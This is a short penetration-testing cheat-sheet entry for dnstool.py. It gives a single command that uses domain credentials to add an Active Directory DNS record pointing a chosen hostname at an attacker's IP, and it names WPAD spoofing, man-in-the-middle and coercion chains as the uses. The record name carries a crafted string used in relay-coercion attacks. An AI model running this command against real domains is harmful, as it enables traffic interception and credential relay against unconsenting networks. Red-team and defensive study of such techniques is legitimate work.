# Dnstool

## dnstool.py

### Add ADIDNS record

Add ADIDNS record with Dnstool.

Write an ADIDNS record (LDAP) pointing a chosen hostname at your attacker IP. Useful for WPAD spoofing, MITM, and coercion chains where the target resolves the name from AD.

```sh title:"Dnstool Add ADIDNS Record"
python3 dnstool.py -u $domain\\$user -p $pass $rhost_ip -a add -d $lhost -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
```
<!-- cheat
var domain
var user
var pass
var rhost_ip
var lhost
-->

